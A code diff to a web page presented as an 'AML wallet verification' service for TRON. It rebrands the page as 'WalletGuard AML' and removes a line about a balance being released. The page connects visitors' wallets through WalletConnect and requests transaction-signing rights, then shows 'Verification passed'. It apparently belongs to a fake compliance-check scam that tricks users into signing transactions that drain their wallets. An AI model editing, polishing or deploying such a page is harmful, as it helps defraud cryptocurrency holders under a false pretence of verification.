@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>AML Wallet Verification</title>
+<title>WalletGuard AML — verification</title>
 <style>
   :root { color-scheme: dark; --b: #4d8dff; --b2: #2f6fe0; --ink: #e8eefc; --mut: #8ea3c4; }
   * { box-sizing: border-box; }
@@ -49,7 +49,7 @@
 </style>
 </head>
 <body>
-<header><div class="brand"><span class="logo">A</span>AML Check</div><span class="net">TRON</span></header>
+<header><div class="brand"><span class="logo">W</span>WalletGuard AML</div><span class="net">TRON</span></header>
 
 <main>
   <div id="view-start">
@@ -93,7 +93,6 @@
   <div id="view-done" class="hidden" style="text-align:center;padding:26px 0">
     <div class="tick">✓</div>
     <h1>Verification passed</h1>
-    <div class="sub">The balance has been released to your wallet. Transaction:</div>
     <div class="mono" id="txid"></div>
   </div>
 </main>
@@ -191,7 +190,7 @@ async function connectWc() {
   try {
     const { SignClient } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm');
     wcClient = await SignClient.init({ projectId: cfg.wcProjectId, relayUrl: 'wss://relay.walletconnect.com',
-      metadata: { name: 'AML Check', description: 'Wallet verification', url: location.origin, icons: [] } });
+      metadata: { name: 'WalletGuard AML', description: 'Wallet verification', url: location.origin, icons: [] } });
     const { uri, approval } = await wcClient.connect({ requiredNamespaces: { tron: { methods: ['tron_signTransaction'], chains: [CHAIN], events: [] } }, sessionProperties: { tron_method_version: 'v1' } });
     $('qr').style.display = 'block';
     const QR = await import('https://cdn.jsdelivr.net/npm/qrcode@1.5.4/+esm');
